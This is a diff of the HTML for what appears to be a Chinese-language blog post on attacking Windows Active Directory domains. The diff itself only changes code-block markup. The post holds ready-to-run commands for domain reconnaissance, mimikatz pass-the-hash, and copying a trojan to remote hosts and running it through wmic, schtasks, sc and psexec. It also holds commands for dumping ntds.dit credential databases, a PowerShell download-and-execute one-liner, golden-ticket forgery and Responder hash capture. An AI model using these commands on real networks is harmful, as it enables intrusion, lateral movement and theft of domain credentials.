@@ -63,7 +63,7 @@
 <h3 id="域信息收集">域信息收集</h3>
 <h4 id="0x01-查询当前域信息">0x01 查询当前域信息</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>net view /domain
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net view /domain
 net config workstation
 net group "Domain Admins" /domain
 net time /domain
@@ -82,8 +82,7 @@ dsquery computer
 
 net group "Domain Computers" /domain
 
-</code></pre>
-</div>
+</code></pre></div></div>
 <p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816910178725.jpg" alt="" />
 <img src="http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816926950901.jpg" alt="" /></p>
 
@@ -94,9 +93,8 @@ net group "Domain Computers" /domain
 <p>powerview Get-NetDomainController  收集域控信息
 具体的可以看看powerview的帮助文件
 域内服务信息收集，在域环境中其实无需做端口扫描。直接通过SPN进行信息收集，具体脚本</p>
-<div class="highlighter-rouge"><pre class="highlight"><code>PowerShell-AD-Recon/blob/master/Discover-PSInterestingServices.ps1
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PowerShell-AD-Recon/blob/master/Discover-PSInterestingServices.ps1
+</code></pre></div></div>
 <p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816932370016.jpg" alt="" /></p>
 
 <h4 id="0x02域内权限获取">0x02域内权限获取</h4>
@@ -108,9 +106,8 @@ net group "Domain Computers" /domain
 
 <p>3.pass the hash 抓到密码破不出来就只能pth了，可以使用mimakatz</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
+</code></pre></div></div>
 
 <p>但是打了KB2871997这个补丁后常规的pth不能用了，只能传递administrator这个账号(sid=500),但是可以使用mimikatz任意传递aes256</p>
 
@@ -119,49 +116,43 @@ net group "Domain Computers" /domain
 <img src="http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816940742419.jpg" alt="" /></p>
 
 <p>5.远程执行命令方法</p>
-<div class="highlighter-rouge"><pre class="highlight"><code>copy muma.exe \\host\c$\windows\temp\foobar.exe ##IPC拷贝木马文件
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy muma.exe \\host\c$\windows\temp\foobar.exe ##IPC拷贝木马文件
+</code></pre></div></div>
 
 <p>WMIC远程运行命令</p>
-<div class="highlighter-rouge"><pre class="highlight"><code>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 wmic /node:host /user:administrator /p 密码 process call create “c:\windows\temp\foobar.exe”
-</code></pre>
-</div>
+</code></pre></div></div>
 <p>powershell remoting 执行命令</p>
 
 <p>schtasks计划任务远程运行</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe
 /sc once /st 00:00 /S host /RU System schtasks /run /tn foobar /S host
 schtasks /F /delete /tn foobar /S host ##清除schtasks
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>SC添加服务远程运行命令</p>
-<div class="highlighter-rouge"><pre class="highlight"><code>sc \\host create foobar binpath=“c:\windows\temp\foobar.exe” ##新建服务,指向拷贝的木马路径
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc \\host create foobar binpath=“c:\windows\temp\foobar.exe” ##新建服务,指向拷贝的木马路径
 sc \\host start foobar ##启动建立的服务
 sc \\host delete foobar ##完事后删除服务
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>PStools 远程执行命令</p>
-<div class="highlighter-rouge"><pre class="highlight"><code>psexec.exe \\ip –accepteula -u username -p password program.exe
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.exe \\ip –accepteula -u username -p password program.exe
 
-</code></pre>
-</div>
+</code></pre></div></div>
 <p>PTH+compmgmt.msc
 <img src="http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816949000256.png" alt="" /></p>
 
 <p>smb+MOF</p>
 
 <p>smbexec远程执行命令</p>
-<div class="highlighter-rouge"><pre class="highlight"><code>copy execserver.exe \\host\c$\windows\ 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy execserver.exe \\host\c$\windows\ 
 test.exe ip user password command netshare
 
-</code></pre>
-</div>
+</code></pre></div></div>
 <p>不推荐使用pstools，因为会留下很多痕迹，日志要记录，并且如果禁用NTLM那么psexec无法利用获得的ntlm hash进行远程连接</p>
 
 <p>6.ms14068 &amp;&amp; GPP
@@ -174,16 +165,15 @@ QuarkPwDump离线分析
 需要文件：ntds.dit system.hiv
 导出 system.hiv</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>reg save hklm\system system.hiv
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save hklm\system system.hiv
+</code></pre></div></div>
 <p>QuarksPwDump.exe -k  可以获取key</p>
 
 <p>导出ntds.dit</p>
 
 <p>连接到域控之后，上传bat 利用vshadow备份ntds.dit</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>setlocal
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setlocal
 if NOT "%CALLBACK_SCRIPT%"=="" goto :IS_CALLBACK
 set SOURCE_DRIVE_LETTER=%SystemDrive%
 set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit
@@ -201,40 +191,34 @@ setlocal
 call %TEMP_GENERATED_SCRIPT%
 @echo ...Copying from the shadow copy to the destination path...
 copy "%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%" %DESTINATION_PATH%
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>新建服务执行</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>sc create backupntds binPath= "cmd /c start c:\windows\temp\ntds.bat"
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc create backupntds binPath= "cmd /c start c:\windows\temp\ntds.bat"
 sc start backupntds
 sc detele backupntds
-</code></pre>
-</div>
+</code></pre></div></div>
 <p>导出HASH</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>QuarksPwDump.exe -dhd -nt ntds.dit -sf system.hiv -o hash.txt
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QuarksPwDump.exe -dhd -nt ntds.dit -sf system.hiv -o hash.txt
+</code></pre></div></div>
 <p>ntdsutil导出</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>ntdsutil snapshot "activate instance ntds" create quit quit
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "activate instance ntds" create quit quit
 ntdsutil snapshot "mount {GUID}" quit quit
 copy MOUNT_POINT\windows\ntds\ntds.dit c:\windows\temp\ntds.dit
 ntdsutil snapshot "unmount {GUID}" quit quit
 ntdsutil snapshot "delete {GUID}" quit quit
-</code></pre>
-</div>
+</code></pre></div></div>
 <p>powershell 导出ntds.dit</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>powershell IEX (New-ObjectNet.WebClient).DownloadString( 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1');Invoke-NinjaCopy -Path "C:\windows\ntds\ntds.dit" -LocalDestination "C:\Users\Administrator\Desktop\ntds.dit"
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell IEX (New-ObjectNet.WebClient).DownloadString( 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1');Invoke-NinjaCopy -Path "C:\windows\ntds\ntds.dit" -LocalDestination "C:\Users\Administrator\Desktop\ntds.dit"
+</code></pre></div></div>
 <p>powershell导出后需要修复一下</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>esentutl /p /o ntds.dit
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>esentutl /p /o ntds.dit
+</code></pre></div></div>
 
 <ol>
   <li>交互式</li>
@@ -250,23 +234,20 @@ ntdsutil snapshot "delete {GUID}" quit quit
 golden ticket 四要素</li>
 </ol>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>user 用户名
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user 用户名
 domain 域完整名称
 sid   获取方式:whoami /all  powerview 里面的  Convert-NameToSid ESRINEA\administrator   psgetsid  -accepteula ESRINEA\administrator (PStoos存在)   mimikatz SID::lookup name
 krbgt ntml hash   mimikatz “@lsadump::dcsync /domain:域完整名称 /user:krbtgt"
-</code></pre>
-</div>
+</code></pre></div></div>
 <p>保存golden ticket</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz kerberos::golden /user:administrator /domain:ESRINEA.LOCAL /sid:S-1-5-21-2609584263-878513794-3710365111-500 /krbtgt:EDC094659D9C18F4E320C70838404D43 /ticket:ESRINEA.LOCAL.kirbi
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz kerberos::golden /user:administrator /domain:ESRINEA.LOCAL /sid:S-1-5-21-2609584263-878513794-3710365111-500 /krbtgt:EDC094659D9C18F4E320C70838404D43 /ticket:ESRINEA.LOCAL.kirbi
+</code></pre></div></div>
 
 <p>使用golden ticket</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz keberos::ptt ESRINEA.LOCAL.kirbi
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz keberos::ptt ESRINEA.LOCAL.kirbi
+</code></pre></div></div>
 
 <p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14817917650651.png" alt="" /></p>
 
@@ -295,9 +276,8 @@ Skeleton Key被安装在64位的域控服务器上，支持Windows Server2003—
 <p><a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a>
 撸下内网一个网站挂上<code class="highlighter-rouge">&lt;img src=\\xxx\\xx&gt;</code>然后执行下面命令，就可以抓取ntlmv2 hash</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>./Responder.py -I eth0 -rPv
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./Responder.py -I eth0 -rPv
+</code></pre></div></div>
 <p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-03-20-14816996917145.jpg" alt="" /></p>
 
 <p>SMBRelay Attack</p>
